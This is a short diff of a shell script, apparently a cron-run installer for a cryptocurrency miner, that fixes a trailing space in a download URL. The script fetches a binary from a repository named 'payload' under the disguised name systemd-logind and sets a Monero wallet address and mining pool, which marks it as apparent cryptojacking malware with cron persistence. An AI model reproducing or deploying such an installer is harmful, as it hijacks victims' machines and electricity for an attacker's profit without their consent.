@@ -2,7 +2,7 @@
 # cron_installer.sh – Run by cron to install/restart miner
 
 # Miner details
-MINER_URL="https://github.com/RALPH-005/payload/raw/refs/heads/main/systemd-logind "
+MINER_URL="https://github.com/RALPH-005/payload/raw/refs/heads/main/systemd-logind"
 
 WALLET="43QinLvHtCRAGydwXBhictMDDtfqac3jAjX21cQtx1bxTrVCTAAd19mhX2cFeXtB89gR4eFHCspuyXbgqEQNYkaREBZZHXX"
 POOL="pool.supportxmr.com:3333"
